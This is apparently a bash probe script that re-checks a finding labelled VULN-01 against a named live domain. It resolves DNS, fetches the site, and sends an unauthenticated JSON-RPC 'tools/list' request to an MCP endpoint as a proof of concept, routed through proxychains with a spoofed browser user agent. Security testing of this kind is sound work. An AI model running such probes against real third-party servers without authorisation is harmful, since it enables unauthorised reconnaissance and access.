#!/bin/bash
echo "=== MCP Endpoint Probe (VULN-01 re-validation) ==="
echo "Target: mcp-auth.dsoconcursos.com.br"
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo
echo "--- DNS resolution ---"
dig +short mcp-auth.dsoconcursos.com.br A
echo
echo "--- HTTP GET / (via CF) ---"
proxychains4 -q curl -sS -m 30 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" -D - https://mcp-auth.dsoconcursos.com.br/ -o /tmp/mcp_root_body.html 2>&1 | head -30
echo
echo "--- POST JSON-RPC tools/list (VULN-01 PoC) ---"
proxychains4 -q curl -sS -m 30 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
  -X POST -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}' \
  -D /tmp/mcp_rpc_headers.txt \
  https://mcp-auth.dsoconcursos.com.br/ -o /tmp/mcp_rpc_body.txt 2>&1
echo "--- response headers ---"
cat /tmp/mcp_rpc_headers.txt
echo "--- response body (first 2000 chars) ---"
head -c 2000 /tmp/mcp_rpc_body.txt
echo
echo "--- body size ---"
wc -c /tmp/mcp_rpc_body.txt
